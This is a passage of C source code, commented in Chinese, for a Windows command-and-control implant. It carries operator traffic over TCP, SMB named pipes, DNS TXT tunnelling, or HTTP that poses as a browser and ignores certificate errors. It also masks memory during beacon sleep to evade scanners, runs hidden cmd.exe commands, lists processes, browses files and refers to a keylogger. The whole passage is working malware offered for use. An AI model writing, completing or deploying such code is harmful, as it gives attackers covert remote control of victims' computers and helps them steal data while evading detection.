    hdr[3] = (unsigned char)(sndlen);

    if (!tcp_send_all(hdr, 4) || !tcp_send_all(snd, sndlen)) { tcp_close(); return 0; }
    if (!tcp_recv_all(hdr, 4)) { tcp_close(); return 0; }

    rlen = ((unsigned int)hdr[0] << 24) | ((unsigned int)hdr[1] << 16) |
           ((unsigned int)hdr[2] << 8)  | (unsigned int)hdr[3];
    if (rlen == 0) return 0;                     /* 空应答 */
    if (rlen > (8u << 20)) { tcp_close(); return 0; }

    {
        int xf = (g_xf.n > 0);
        unsigned char *rawbuf = xf ? g_xf_in : out;
        unsigned int   rawcap = xf ? XF_BUF_SIZE : outcap;

        if (rlen > rawcap) { tcp_close(); return 0; }
        if (!tcp_recv_all(rawbuf, rlen)) { tcp_close(); return 0; }

        if (xf) {
            unsigned int plen = 0;
            if (xform_decode(&g_xf, rawbuf, rlen, out, outcap, &plen) != 0) return 0;
            return plen;
        }
    }
    return rlen;
}

#elif C2_TRANSPORT_SMB
/* ============================ SMB 命名管道承载层 ============================
 * 分帧与 TCP 相同: [4B 大端长度][帧字节]。
 * 只用 kernel32 的 CreateFileA / ReadFile / WriteFile, 不新增静态导入。
 * 管道必须由服务端先创建 (csdev-server.exe --smb <name>)。
 * ========================================================================= */

static HANDLE g_pipe = NULL;

static int c2_open(void)
{
    g_pipe = CreateFileA(C2_PIPE, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                         OPEN_EXISTING, 0, NULL);
    if (g_pipe == INVALID_HANDLE_VALUE) {
        g_pipe = NULL;
        return 0;
    }
    return 1;
}

static void c2_close(void)
{
    if (g_pipe) {
        CloseHandle(g_pipe);
        g_pipe = NULL;
    }
}

static int smb_send_all(const unsigned char *d, unsigned int n)
{
    DWORD written;
    unsigned int sent = 0;
    while (sent < n) {
        if (!WriteFile(g_pipe, d + sent, n - sent, &written, NULL) || written == 0) return 0;
        sent += (unsigned int)written;
    }
    return 1;
}

static int smb_recv_all(unsigned char *d, unsigned int n)
{
    DWORD got;
    unsigned int rcv = 0;
    while (rcv < n) {
        if (!ReadFile(g_pipe, d + rcv, n - rcv, &got, NULL) || got == 0) return 0;
        rcv += (unsigned int)got;
    }
    return 1;
}

static unsigned int c2_post(const unsigned char *data, unsigned int len,
                            unsigned char *out, unsigned int outcap)
{
    unsigned char  hdr[4];
    unsigned char *snd;
    unsigned int   sndlen = len, rlen;

    if (!g_pipe) {
        if (!c2_open()) return 0;
    }

    if (g_xf.n > 0) {
        unsigned int xl = 0;
        if (xform_encode(&g_xf, data, len, g_xf_out, XF_BUF_SIZE, &xl) != 0) return 0;
        snd = g_xf_out;
        sndlen = xl;
    } else {
        snd = (unsigned char *)data;
    }
    if (sndlen == 0 || sndlen > (8u << 20)) return 0;

    hdr[0] = (unsigned char)(sndlen >> 24);
    hdr[1] = (unsigned char)(sndlen >> 16);
    hdr[2] = (unsigned char)(sndlen >> 8);
    hdr[3] = (unsigned char)(sndlen);

    if (!smb_send_all(hdr, 4) || !smb_send_all(snd, sndlen)) { c2_close(); return 0; }
    if (!smb_recv_all(hdr, 4)) { c2_close(); return 0; }

    rlen = ((unsigned int)hdr[0] << 24) | ((unsigned int)hdr[1] << 16) |
           ((unsigned int)hdr[2] << 8)  | (unsigned int)hdr[3];
    if (rlen == 0) return 0;                     /* 空应答 */
    if (rlen > (8u << 20)) { c2_close(); return 0; }

    {
        int xf = (g_xf.n > 0);
        unsigned char *rawbuf = xf ? g_xf_in : out;
        unsigned int   rawcap = xf ? XF_BUF_SIZE : outcap;

        if (rlen > rawcap) { c2_close(); return 0; }
        if (!smb_recv_all(rawbuf, rlen)) { c2_close(); return 0; }
        if (xf) {
            unsigned int plen = 0;
            if (xform_decode(&g_xf, rawbuf, rlen, out, outcap, &plen) != 0) return 0;
            return plen;
        }
    }
    return rlen;
}

#elif C2_TRANSPORT_DNS
/* ============================ DNS 承载层 ============================
 * 线格式 (与服务端 go/dns_listener.go 对齐):
 *   上行: <idx>.<total>.<b32分片>.<sid>u.<域名>   (TXT 查询)
 *   下行: <j>.<sid>g.<域名>
 *   应答: TXT 内容 = [1B 标志][原始字节]
 *         0x00 = 分片数据, 0x01 = 无更多数据, 0x02 = 帧非法
 *
 * 约束: 每查询约 125 字节有效载荷, 因此本通道只适合指令与文本结果,
 *       不适合大文件 (与服务端注释一致)。
 * ws2_32 全部运行期解析, 静态导入表不变。
 * ================================================================== */

#define DNS_MAX_FRAME   65536u
#define DNS_MAX_CHUNKS  512u
#define DNS_CHUNK_BYTES 125u

typedef struct {
    unsigned int  sock;
    int           started;
    int           (WINAPI *WSAStartup)(unsigned short, void *);
    int           (WINAPI *WSACleanup)(void);
    unsigned int  (WINAPI *sock_open)(int, int, int);
    int           (WINAPI *sock_sendto)(unsigned int, const char *, int, int, const void *, int);
    int           (WINAPI *sock_recvfrom)(unsigned int, char *, int, int, void *, int *);
    int           (WINAPI *sock_close)(unsigned int);
    int           (WINAPI *sock_opt)(unsigned int, int, int, const char *, int);
    unsigned short(WINAPI *htons_)(unsigned short);
    unsigned int  (WINAPI *inet_addr_)(const char *);
} DNSDYN;

typedef struct { unsigned short family; unsigned short port; unsigned int addr; char zero[8]; } DNSADDR;

static DNSDYN g_dns;
static unsigned short g_dns_id = 0x1000;

/* 调试日志 (仅 -DC2_DEBUG_DNS=1 时启用, 写入固定路径便于排查) */
#ifdef C2_DEBUG_DNS
static unsigned int my_strlen_local(const char *s)
{
    unsigned int n = 0;
    while (s[n]) n++;
    return n;
}
static void dbg(const char *s)
{
    HANDLE h = CreateFileA("C:\\csdev_dns_debug.log", FILE_APPEND_DATA,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w;
        SetFilePointer(h, 0, NULL, FILE_END);
        WriteFile(h, s, (DWORD)my_strlen_local(s), &w, NULL);
        CloseHandle(h);
    }
}
static void dbgn(const char *tag, unsigned int v)
{
    char buf[64];
    unsigned int k = 0, i;
    char t[16];
    int m = 0;
    while (tag[k] && k < 40) { buf[k] = tag[k]; k++; }
    if (v == 0) t[m++] = '0';
    while (v) { t[m++] = (char)('0' + (v % 10)); v /= 10; }
    for (i = 0; i < (unsigned int)m && k < 60; i++) buf[k++] = t[m - 1 - i];
    buf[k++] = '\n';
    buf[k] = 0;
    dbg(buf);
}
#else
#define dbg(s)  ((void)0)
#define dbgn(t, v) ((void)0)
#endif

static int dns_dyn_load(void)
{
    HMODULE h;
    if (g_dns.WSAStartup) return 1;
    h = LoadLibraryA("ws2_32.dll");
    if (!h) { dbg("ws2_32 load fail\n"); return 0; }
    *(FARPROC *)&g_dns.WSAStartup    = GetProcAddress(h, "WSAStartup");
    *(FARPROC *)&g_dns.WSACleanup    = GetProcAddress(h, "WSACleanup");
    *(FARPROC *)&g_dns.sock_open     = GetProcAddress(h, "socket");
    *(FARPROC *)&g_dns.sock_sendto   = GetProcAddress(h, "sendto");
    *(FARPROC *)&g_dns.sock_recvfrom = GetProcAddress(h, "recvfrom");
    *(FARPROC *)&g_dns.sock_close    = GetProcAddress(h, "closesocket");
    *(FARPROC *)&g_dns.sock_opt      = GetProcAddress(h, "setsockopt");
    *(FARPROC *)&g_dns.htons_        = GetProcAddress(h, "htons");
    *(FARPROC *)&g_dns.inet_addr_    = GetProcAddress(h, "inet_addr");
    dbg("dyn loaded\n");
    return g_dns.WSAStartup && g_dns.sock_open && g_dns.sock_sendto &&
           g_dns.sock_recvfrom && g_dns.sock_close && g_dns.htons_;
}

static const char B32A[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

/* RFC4648 base32 (无填充), 与服务端 base32.NoPadding 对齐 */
static unsigned int b32_encode(const unsigned char *in, unsigned int len, char *out)
{
    unsigned int i = 0, o = 0;
    while (i < len) {
        unsigned int rem = len - i;
        unsigned int b0 = in[i];
        unsigned int b1 = (rem > 1) ? in[i + 1] : 0;
        unsigned int b2 = (rem > 2) ? in[i + 2] : 0;
        unsigned int b3 = (rem > 3) ? in[i + 3] : 0;
        unsigned int b4 = (rem > 4) ? in[i + 4] : 0;

        out[o++] = B32A[(b0 >> 3) & 0x1F];
        out[o++] = B32A[((b0 << 2) | (b1 >> 6)) & 0x1F];
        if (rem > 1) out[o++] = B32A[(b1 >> 1) & 0x1F];
        if (rem > 1) out[o++] = B32A[((b1 << 4) | (b2 >> 4)) & 0x1F];
        if (rem > 2) out[o++] = B32A[((b2 << 1) | (b3 >> 7)) & 0x1F];
        if (rem > 3) out[o++] = B32A[(b3 >> 2) & 0x1F];
        if (rem > 3) out[o++] = B32A[((b3 << 3) | (b4 >> 5)) & 0x1F];
        if (rem > 4) out[o++] = B32A[b4 & 0x1F];
        i += 5;
    }
    out[o] = 0;
    return o;
}

static int dns_connect(void)
{
    unsigned char wsadata[512];
    int i;
    if (!dns_dyn_load()) return 0;
    if (!g_dns.started) {
        for (i = 0; i < (int)sizeof(wsadata); i++) wsadata[i] = 0;
        if (g_dns.WSAStartup(0x0202, wsadata) != 0) return 0;
        g_dns.started = 1;
    }
    return 1;
}

static void dns_disconnect(void)
{
    if (g_dns.started && g_dns.WSACleanup) {
        g_dns.WSACleanup();
        g_dns.started = 0;
    }
}

/* 构造 DNS 查询报文 */
static int dns_build_query(const char *qname, unsigned char *out, unsigned int cap)
{
    unsigned int n = 12, i;
    const char *p = qname;

    if (cap < 32) return 0;
    for (i = 0; i < 12; i++) out[i] = 0;
    g_dns_id++;
    out[0] = (unsigned char)(g_dns_id >> 8);
    out[1] = (unsigned char)g_dns_id;
    out[2] = 0x01;                  /* RD=1 */
    out[5] = 1;                     /* QDCOUNT=1 */

    while (*p) {
        const char *dot = p;
        unsigned int len;
        while (*dot && *dot != '.') dot++;
        len = (unsigned int)(dot - p);
        if (len == 0 || len > 63) return 0;
        if (n + 1 + len + 6 > cap) return 0;
        out[n++] = (unsigned char)len;
        for (i = 0; i < len; i++) out[n++] = (unsigned char)p[i];
        p = (*dot == '.') ? dot + 1 : dot;
    }
    out[n++] = 0;
    out[n++] = 0; out[n++] = 16;    /* QTYPE = TXT */
    out[n++] = 0; out[n++] = 1;     /* QCLASS = IN */
    return (int)n;
}

/* 从应答里提取第一个 TXT 字符串 */
static int dns_extract_txt(const unsigned char *pkt, unsigned int len,
                           unsigned char *out, unsigned int cap)
{
    unsigned int off = 12, qd, i;
    unsigned int rdlen, n;

    if (len < 12) return 0;
    qd = ((unsigned int)pkt[4] << 8) | pkt[5];
    for (i = 0; i < qd && off < len; i++) {
        while (off < len && pkt[off] != 0) {
            if ((pkt[off] & 0xC0) == 0xC0) { off++; break; }
            off += 1 + pkt[off];
        }
        off += 5;
    }
    if (off + 12 > len) return 0;
    if ((pkt[off] & 0xC0) == 0xC0) off += 2;
    else { while (off < len && pkt[off] != 0) off += 1 + pkt[off]; off++; }
    if (off + 10 > len) return 0;
    rdlen = ((unsigned int)pkt[off + 8] << 8) | pkt[off + 9];
    off += 10;
    if (rdlen < 1 || off + rdlen > len) return 0;
    n = pkt[off];
    if (n > cap || off + 1 + n > len) return 0;
    for (i = 0; i < n; i++) out[i] = pkt[off + 1 + i];
    return (int)n;
}

/* 发送一个查询并等应答; 返回 TXT 内容长度, 0 表示失败/超时 */
static unsigned int dns_ask(const char *qname, unsigned char *out, unsigned int cap)
{
    unsigned char  qbuf[512];
    unsigned char  rbuf[1024];
    DNSADDR        sa;
    int            qn, i, rc;
    unsigned int   sock;

    qn = dns_build_query(qname, qbuf, sizeof(qbuf));
    if (qn <= 0) { dbg("build_query fail\n"); return 0; }
    dbgn("qn=", (unsigned int)qn);

    sock = g_dns.sock_open(2, 2, 0);            /* AF_INET, SOCK_DGRAM */
    if (sock == 0xFFFFFFFFu) { dbg("socket fail\n"); return 0; }

    {
        DWORD tv[2];
        tv[0] = 4000; tv[1] = 4000;
        if (g_dns.sock_opt) g_dns.sock_opt(sock, 0xFFFF, 0x1006, (const char *)tv, sizeof(DWORD));
    }

    for (i = 0; i < (int)sizeof(sa); i++) ((unsigned char *)&sa)[i] = 0;
    sa.family = 2;
    sa.port   = g_dns.htons_((unsigned short)C2_PORT);
    sa.addr   = g_dns.inet_addr_(C2_HOST);
    if (sa.addr == 0xFFFFFFFFu) { dbg("inet_addr fail\n"); g_dns.sock_close(sock); return 0; }
    dbgn("port=", (unsigned int)sa.port);
    dbgn("addr=", (unsigned int)sa.addr);

    {
        int snt = g_dns.sock_sendto(sock, (const char *)qbuf, qn, 0, &sa, (int)sizeof(sa));
        dbgn("sendto=", (unsigned int)snt);
        if (snt <= 0) { g_dns.sock_close(sock); return 0; }
    }

    {
        int fromlen = (int)sizeof(sa);
        rc = g_dns.sock_recvfrom(sock, (char *)rbuf, sizeof(rbuf), 0, &sa, &fromlen);
        dbgn("recv=", (unsigned int)rc);
    }
    g_dns.sock_close(sock);
    if (rc <= 0) return 0;

    {
        int tl = dns_extract_txt(rbuf, (unsigned int)rc, out, cap);
        dbgn("txtlen=", (unsigned int)tl);
        return (unsigned int)tl;
    }
}

static int c2_open(void)
{
    return dns_connect();
}

static void c2_close(void)
{
    dns_disconnect();
}

/* sid 标签: 用本进程 PID 的十进制, 保证多实例不互相污染分片组装 */
static char g_dns_sid[16];

static void dns_sid_init(void)
{
    unsigned int v = GetCurrentProcessId();
    char t[16];
    int n = 0, k = 0;
    if (v == 0) t[n++] = '0';
    while (v) { t[n++] = (char)('0' + (v % 10)); v /= 10; }
    while (n > 0 && k < (int)sizeof(g_dns_sid) - 1) g_dns_sid[k++] = t[--n];
    g_dns_sid[k] = 0;
}

static unsigned int c2_post(const unsigned char *data, unsigned int len,
                            unsigned char *out, unsigned int outcap)
{
    unsigned char  payload[DNS_MAX_FRAME];
    unsigned char  reply[512];
    unsigned int   plen = len, chunks, i, total = 0;
    char           qname[256], b32[DNS_CHUNK_BYTES * 8 / 5 + 8];

    if (!g_dns_sid[0]) dns_sid_init();

    /* 上行变换 */
    if (g_xf.n > 0) {
        unsigned int xl = 0;
        if (xform_encode(&g_xf, data, len, payload, sizeof(payload), &xl) != 0) return 0;
        plen = xl;
    } else {
        if (len > sizeof(payload)) return 0;
        bmemcpy(payload, data, len);
    }
    if (plen == 0) return 0;

    /* 分片上行 */
    chunks = (plen + DNS_CHUNK_BYTES - 1) / DNS_CHUNK_BYTES;
    if (chunks == 0) chunks = 1;
    if (chunks > DNS_MAX_CHUNKS) {
        /* 超出 DNS 通道能力: 明确拒绝而不是静默截断 */
        return 0;
    }

    for (i = 0; i < chunks; i++) {
        unsigned int off = i * DNS_CHUNK_BYTES;
        unsigned int n = plen - off;
        unsigned int k = 0, q;

        if (n > DNS_CHUNK_BYTES) n = DNS_CHUNK_BYTES;
        b32_encode(payload + off, n, b32);

        /* <idx>.<total>.<b32>.<sid>u.d */
        {
            char num[16];
            unsigned int v = i, m = 0;
            if (v == 0) num[m++] = '0';
            while (v) { num[m++] = (char)('0' + (v % 10)); v /= 10; }
            while (m > 0 && k < sizeof(qname) - 2) qname[k++] = num[--m];
        }
        qname[k++] = '.';
        {
            char num[16];
            unsigned int v = chunks, m = 0;
            if (v == 0) num[m++] = '0';
            while (v) { num[m++] = (char)('0' + (v % 10)); v /= 10; }
            while (m > 0 && k < sizeof(qname) - 2) qname[k++] = num[--m];
        }
        qname[k++] = '.';
        /* base32 必须按 ≤60 字符切段: DNS 单标签硬上限是 63 字节。
         * 早先把它整段放进一个标签, 导致 dns_build_query 直接失败 (已修)。 */
        {
            unsigned int q = 0;
            while (b32[q] && k < sizeof(qname) - 24) {
                unsigned int seg = 0;
                while (b32[q] && seg < 60 && k < sizeof(qname) - 24) {
                    qname[k++] = b32[q++];
                    seg++;
                }
                qname[k++] = '.';
            }
        }
        for (q = 0; g_dns_sid[q] && k < sizeof(qname) - 12; q++) qname[k++] = g_dns_sid[q];
        qname[k++] = 'u';
        qname[k++] = '.';
        qname[k++] = 'd';
        qname[k] = 0;

        {
            unsigned int r = dns_ask(qname, reply, sizeof(reply));
            if (r == 0) return 0;              /* 超时/失败 */
            if (i == chunks - 1) {
                /* 最后一包的应答携带状态 */
                if (reply[0] == 0x02) return 0;  /* 服务端拒收 */
            }
        }
    }

    /* 轮询下行分片, 直到服务端说"无更多数据" */
    for (i = 0; i < DNS_MAX_CHUNKS; i++) {
        unsigned int r, k = 0;
        char num[16];
        unsigned int v = i, m = 0;

        if (v == 0) num[m++] = '0';
        while (v) { num[m++] = (char)('0' + (v % 10)); v /= 10; }
        while (m > 0 && k < sizeof(qname) - 2) qname[k++] = num[--m];
        qname[k++] = '.';
        {
            unsigned int q;
            for (q = 0; g_dns_sid[q] && k < sizeof(qname) - 12; q++) qname[k++] = g_dns_sid[q];
        }
        qname[k++] = 'g';
        qname[k++] = '.';
        qname[k++] = 'd';
        qname[k] = 0;

        r = dns_ask(qname, reply, sizeof(reply));
        if (r == 0) break;
        if (reply[0] == 0x01) break;           /* 无更多数据 */

        if (reply[0] == 0x00) {
            unsigned int n = r - 1;
            if (total + n > outcap) n = outcap - total;
            if (n > 0) {
                bmemcpy(out + total, reply + 1, n);
                total += n;
            }
            if (total >= outcap) break;
        } else {
            break;
        }
    }

    if (total == 0) return 0;

    /* 下行变换 */
    if (g_xf.n > 0) {
        static unsigned char dec[65536];
        unsigned int pl = 0;
        if (xform_decode(&g_xf, out, total, dec, sizeof(dec), &pl) != 0) return 0;
        if (pl > outcap) pl = outcap;
        bmemcpy(out, dec, pl);
        return pl;
    }
    return total;
}

#else  /* ---------------- HTTP 承载层 ---------------- */

static int c2_open(void)
{
    WCHAR wua[144], whost[192];
    const WCHAR *d = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                     L"AppleWebKit/537.36 (KHTML, like Gecko) "
                     L"Chrome/121.0.0.0 Safari/537.36";
    const char *h = C2_HOST;
    int i;

    for (i = 0; d[i] && i < 143; i++) wua[i] = d[i];
    wua[i] = 0;

    g_hs = WinHttpOpen(wua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                       WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!g_hs) return 0;

    for (i = 0; h[i] && i < 191; i++) whost[i] = (WCHAR)h[i];
    whost[i] = 0;

    g_hc = WinHttpConnect(g_hs, whost, (INTERNET_PORT)C2_PORT, 0);
    if (!g_hc) { WinHttpCloseHandle(g_hs); g_hs = NULL; return 0; }
    return 1;
}

static void c2_close(void)
{
    if (g_hc) { WinHttpCloseHandle(g_hc); g_hc = NULL; }
    if (g_hs) { WinHttpCloseHandle(g_hs); g_hs = NULL; }
}

static unsigned int c2_post(const unsigned char *data, unsigned int len,
                            unsigned char *out, unsigned int outcap)
{
    HINTERNET hR;
    DWORD     flags = C2_SSL ? WINHTTP_FLAG_SECURE : 0;
    WCHAR     wuri[256];
    unsigned int total = 0, sendlen = len;
    const unsigned char *sendbuf = data;
    int i;

    if (!g_hc) return 0;

    /* 上行: profile body 变换 */
    if (g_xf.n > 0) {
        unsigned int xl = 0;
        if (xform_encode(&g_xf, data, len, g_xf_out, XF_BUF_SIZE, &xl) != 0) return 0;
        sendbuf = g_xf_out;
        sendlen = xl;
    }

    for (i = 0; C2_URI[i] && i < 255; i++) wuri[i] = (WCHAR)C2_URI[i];
    wuri[i] = 0;

    hR = WinHttpOpenRequest(g_hc, L"POST", wuri, NULL, WINHTTP_NO_REFERER,
                            WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hR) return 0;

    /* 单次请求有界: 解析/连接各 5s, 收发各 15s。
     * 没有超时的 WinHTTP 会在服务端卡住响应时把植入体永久堵死在
     * WinHttpReceiveResponse / WinHttpReadData 里 —— 这是"一条一条堵死通信"的
     * 最主要来源。超时后 c2_post 返回 0, 主循环按网络失败处理并保留 outbox 重试。 */
    WinHttpSetTimeouts(hR, 5000, 5000, 15000, 15000);

    if (C2_SSL) {
        DWORD opt = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                  | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                  | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                  | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hR, WINHTTP_OPTION_SECURITY_FLAGS, &opt, sizeof(opt));
    }

    /* profile 声明的标识头 */
    if (C2_ID_HEADER[0]) {
        WCHAR hdr[512];
        int k = 0, t = 0;
        for (k = 0; C2_ID_HEADER[k] && t < 200; k++) hdr[t++] = (WCHAR)C2_ID_HEADER[k];
        hdr[t++] = ':';
        hdr[t++] = ' ';
        for (k = 0; C2_ID_VALUE[k] && t < 500; k++) hdr[t++] = (WCHAR)C2_ID_VALUE[k];
        hdr[t++] = 13;
        hdr[t++] = 10;
        hdr[t] = 0;
        WinHttpAddRequestHeaders(hR, hdr, (DWORD)-1L,
            WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    }

    if (!WinHttpSendRequest(hR,
            L"Content-Type: application/octet-stream\r\n"
            L"Connection: Keep-Alive\r\n",
            (DWORD)-1L, (LPVOID)sendbuf, sendlen, sendlen, 0)
        || !WinHttpReceiveResponse(hR, NULL)) {
        WinHttpCloseHandle(hR);
        return 0;
    }

    {
        /* 有变换时先读到原始缓冲, 再逆变换到调用方缓冲 */
        int xf = (g_xf.n > 0);
        unsigned char *rawbuf = xf ? g_xf_in : out;
        unsigned int   rawcap = xf ? XF_BUF_SIZE : outcap;

        for (;;) {
            DWORD avail = 0, got = 0;
            if (!WinHttpQueryDataAvailable(hR, &avail) || avail == 0) break;
            if (total + avail > rawcap) avail = rawcap - total;
            if (avail == 0) break;
            if (!WinHttpReadData(hR, rawbuf + total, avail, &got) || got == 0) break;
            total += got;
        }
        WinHttpCloseHandle(hR);

        if (xf && total > 0) {
            unsigned int plen = 0;
            if (xform_decode(&g_xf, rawbuf, total, out, outcap, &plen) != 0) return 0;
            return plen;
        }
    }
    return total;
}

#endif /* C2_TRANSPORT_TCP */

/* ------------------------------------------------------------ 睡眠控制 */

static void beacon_sleep(unsigned int ms, unsigned char jitter)
{
    unsigned int actual = ms;
    unsigned char r = 0;
    int masked = 0;

    if (jitter > 0 && csdev_random(&r, 1)) {
        unsigned int j = ((ms * (unsigned int)r) / 255u) * jitter / 100u;
        actual = (ms > j) ? (ms - j) : ms / 2u;
    }
    if (actual == 0) actual = 1000u;

#if C2_SLEEP_MASK
    /* 休眠窗口内掩码非执行节 (.rdata/.data), 抹掉静态字符串与配置特征。
     * 掩码期间保持不动 (不在分片之间来回解密), 以减少可被采样的窗口。 */
    masked = smask_begin();
#endif

    /* 分片睡眠 */
    while (actual > 0) {
        unsigned int slice = (actual > 1000u) ? 1000u : actual;
        Sleep(slice);
        actual -= slice;
    }

#if C2_SLEEP_MASK
    if (masked) smask_end();
#else
    (void)masked;
#endif
}

#if C2_SLEEP_MASK
/* sleep mask 的忙检查: 键盘记录线程会访问全局缓冲, 掩码会让它读到垃圾 */
static int smask_busy(void)
{
    return ops_keylog_active();
}
#endif

/* ---------------------------------------------------------------- 命令 */

static unsigned int cmd_shell(const char *cmd, unsigned char *out, unsigned int cap)
{
    SECURITY_ATTRIBUTES sa;
    HANDLE hRd = NULL, hWr = NULL;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char buf[4096];
    char full[4096];
    DWORD got;
    unsigned int total = 0, i = 0, k;
    int ok;

    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&hRd, &hWr, &sa, 0)) return 0;
    SetHandleInformation(hRd, HANDLE_FLAG_INHERIT, 0);

    bmemset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWr;
    si.hStdError  = hWr;
    si.hStdInput  = NULL;

    {
        const char *pfx = "cmd.exe /c ";
        for (k = 0; pfx[k] && i < sizeof(full) - 2; k++) full[i++] = pfx[k];
        for (k = 0; cmd[k] && i < sizeof(full) - 1; k++) full[i++] = cmd[k];
        full[i] = 0;
    }

    ok = CreateProcessA(NULL, full, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi);
    CloseHandle(hWr);

    if (!ok) { CloseHandle(hRd); return 0; }

    /* 有界读取: 用 PeekNamedPipe 轮询, 最多等 10 秒。
     *
     * 原实现是裸 ReadFile 循环 —— 一旦命令长驻 (ping -t / powershell / 一个
     * 不主动关 stdout 的子进程), 管道永远不 EOF, ReadFile 永远阻塞, 整个植入体
     * 就死在这里, 心跳停摆。这里改成: 进程退出且无残留数据即正常结束, 超时则
     * TerminateProcess 强制收场, 保证任何一条 shell 命令都堵不死通信。 */
    {
        DWORD t0 = GetTickCount();
        for (;;) {
            DWORD avail = 0;
            DWORD now = GetTickCount();

            if (!PeekNamedPipe(hRd, NULL, 0, NULL, &avail, NULL)) break;

            if (avail == 0) {
                if (WaitForSingleObject(pi.hProcess, 0) == WAIT_OBJECT_0) break; /* 正常结束 */
                if (now - t0 > 10000u) { TerminateProcess(pi.hProcess, 1); break; } /* 超时收场 */
                Sleep(30);
                continue;
            }

            if (avail > sizeof(buf)) avail = sizeof(buf);
            if (total + avail > cap) avail = cap - total;
            if (avail == 0) break;
            if (!ReadFile(hRd, buf, avail, &got, NULL) || got == 0) break;
            bmemcpy(out + total, buf, got);
            total += got;
            if (total >= cap) break;
        }
    }

    CloseHandle(hRd);
    WaitForSingleObject(pi.hProcess, 3000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return total;
}

static unsigned int cmd_proc_list(unsigned char *out, unsigned int cap)
{
    HANDLE snap;
    PROCESSENTRY32 pe;
    unsigned int total = 0, k;

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            char line[320];
            unsigned int i = 0;
            unsigned int v = pe.th32ProcessID;
            char t[16];
            int n = 0;

            if (v == 0) t[n++] = '0';
            while (v) { t[n++] = (char)('0' + (v % 10)); v /= 10; }
            while (n > 0 && i < 300) line[i++] = t[--n];
            if (i < 310) line[i++] = '\t';
            for (k = 0; pe.szExeFile[k] && i < 315; k++) line[i++] = pe.szExeFile[k];
            line[i++] = '\r';
            line[i++] = '\n';

            if (total + i > cap) break;
            bmemcpy(out + total, line, i);
            total += i;
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return total;
}

/* 结构化进程列表: pid \t ppid \t threads \t name */
static unsigned int cmd_ps_list(unsigned char *out, unsigned int cap)
{
    HANDLE snap;
    PROCESSENTRY32 pe;
    unsigned int total = 0, k;

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            char line[400];
            unsigned int i = 0;
            unsigned int fields[3];
            int fi;

            fields[0] = pe.th32ProcessID;
            fields[1] = pe.th32ParentProcessID;
            fields[2] = pe.cntThreads;

            for (fi = 0; fi < 3; fi++) {
                unsigned int v = fields[fi];
                char t[16];
                int n = 0;
                if (v == 0) t[n++] = '0';
                while (v) { t[n++] = (char)('0' + (v % 10)); v /= 10; }
                while (n > 0 && i < 380) line[i++] = t[--n];
                if (i < 390) line[i++] = '\t';
            }
            for (k = 0; pe.szExeFile[k] && i < 395; k++) line[i++] = pe.szExeFile[k];
            line[i++] = '\r';
            line[i++] = '\n';

            if (total + i > cap) break;
            bmemcpy(out + total, line, i);
            total += i;
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return total;
}

/* 文件系统操作: op 见 frame.h 约定, 输出为文本 */
static unsigned int cmd_fs_ops(char op, const char *arg, char *cwd, unsigned int cwdlen,
                               unsigned char *out, unsigned int cap)
{
    unsigned int total = 0;

    switch (op) {
    case 0x01:   /* pwd */
        {
            unsigned int L = bstrlen(cwd);
            if (L + 3 < cap) { bmemcpy(out, cwd, L); out[L] = '\r'; out[L + 1] = '\n'; total = L + 2; }
        }
        break;

    case 0x02:   /* cd */
        if (arg[0] == 0) {
            bstrcpy_n(cwd, "C:\\", cwdlen);
        } else {
            char probe[600];
            DWORD a = GetFileAttributesA(arg);
            if (a != INVALID_FILE_ATTRIBUTES && (a & FILE_ATTRIBUTE_DIRECTORY)) {
                bstrcpy_n(cwd, arg, cwdlen);
            } else {
                bstrcpy_n(probe, "[-] 目录不存在\r\n", sizeof(probe));
                bmemcpy(out, probe, bstrlen(probe));
                total = bstrlen(probe);
            }
        }
        break;

    case 0x03:   /* ls */
        {
            char pat[600];
            WIN32_FIND_DATAA fd;
            HANDLE h;
            unsigned int i = 0;

            bstrcpy_n(pat, (arg[0] ? arg : cwd), sizeof(pat));
            {
                unsigned int L = bstrlen(pat);
                if (L + 3 < sizeof(pat)) {
                    if (L > 0 && pat[L - 1] != '\\') { pat[L++] = '\\'; }
                    pat[L++] = '*'; pat[L] = 0;
                }
            }

            h = FindFirstFileA(pat, &fd);
            if (h == INVALID_HANDLE_VALUE) {
                const char *e = "[-] 无法枚举目录\r\n";
                unsigned int L = bstrlen(e);
                if (L < cap) { bmemcpy(out, e, L); total = L; }
                break;
            }
            do {
                char line[540];
                unsigned int n = 0, k;
                unsigned int sz = fd.nFileSizeLow;

                if (fd.cFileName[0] == '.' && fd.cFileName[1] == 0) continue;
                if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && 0) continue;

